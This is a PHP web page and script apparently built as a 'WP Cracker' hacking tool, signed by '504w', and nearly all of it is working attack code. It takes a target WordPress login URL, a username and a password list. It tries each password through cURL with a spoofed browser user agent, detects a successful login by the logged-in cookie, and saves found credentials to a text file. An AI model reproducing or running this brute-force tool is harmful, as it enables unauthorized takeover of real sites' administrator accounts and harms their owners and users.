<html>
    <head>
        <title>WP Cracker By 504w</title>
    <style type="text/css">
    .input{
        width:300px;
        height: 30px;
        border: thin solid #8000FF;
        color: #8000FF;
        padding: 5px;
    }
    .input2{
        width:400px;
        max-width: 400px;
        height: 450px;
        max-height: 450px;
        border: thin solid #8000FF;
        color: #8000FF;
        padding: 5px;
    }
    .btn{
        width: 100px;
        height: 30px;
        color: #ffffff;
        border: none;
        background-color: #8000FF;
    }
    h3{
        color: #8000FF;
    }
    </style>
    </head>
    
    <body>
    <div style="text-align: center;">
        <h3>[ EST ]WP Cracker Coded By 504w</h3>
        <form action="<?php $_SERVER['PHP_SELF'] ?>" method="POST">
            <input type="text" name="username" placeholder=" Username" class="input" /> <br /><br />
            <input type="text" name="url" placeholder="Url" class="input"/><br /><br />
            <textarea name="passlist" class="input2" placeholder="PassWord List"></textarea> <br />
            <input type="submit" name="submit" class="btn"/>
        </form>
    </div>
    </body>
</html>
<?php
set_time_limit(0);
ignore_user_abort(true);
if(isset($_POST['submit'])){
$log = $_POST['username'];
$pwd = explode("\n" , $_POST['passlist']);
$wp_login = $_POST['url'];
$cookie="cookie.txt";
function check($log , $pwd , $wp_login , $cookie){
	$ch = curl_init(); 
	curl_setopt($ch, CURLOPT_USERAGENT, "Mozilla/5.0 (Macintosh; U; PPC Mac OS X Mach-O; en-US; rv:1.8.1.12) Gecko/20080201 Firefox/2.0.0.12");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1); 
	curl_setopt($ch, CURLOPT_URL, $wp_login); 
	curl_setopt($ch, CURLOPT_HTTPAUTH, CURLAUTH_ANY); 
	curl_setopt ($ch, CURLOPT_COOKIEJAR, 'cookie.txt'); 
	curl_setopt($ch, CURLOPT_HEADER , 1); 
	curl_setopt($ch, CURLOPT_POSTFIELDS, 'log=' . $log . '&pwd=' . $pwd . '&redirect_to=wp-admin/&rememberme=forever&testcookie=1');
	ob_start(); 
	$response = curl_exec ($ch); 
	ob_end_clean(); 
	curl_close ($ch); 
	unset($ch); 
    $GLOBALS['f'] = 0;
	if(preg_match("/wordpress_logged_in/" , $response)){
	    echo "Found : <a href='Founds.txt' target='_blank' > Click </a>";
		$str = "\r\n\r\nUserName : $log \r\nPassword : $pwd \r\nUrl : $wp_login \r\n\r\n===================================";
        $file = fopen("Founds.txt" , "a+");
        fwrite($file , $str);
        fclose($file);
        $GLOBALS['f']++;
	}


}
foreach($pwd as $pwds){
	check($log , $pwds , $wp_login , $cookie);
}
if($f===0){
    echo "Not found !";
}
}
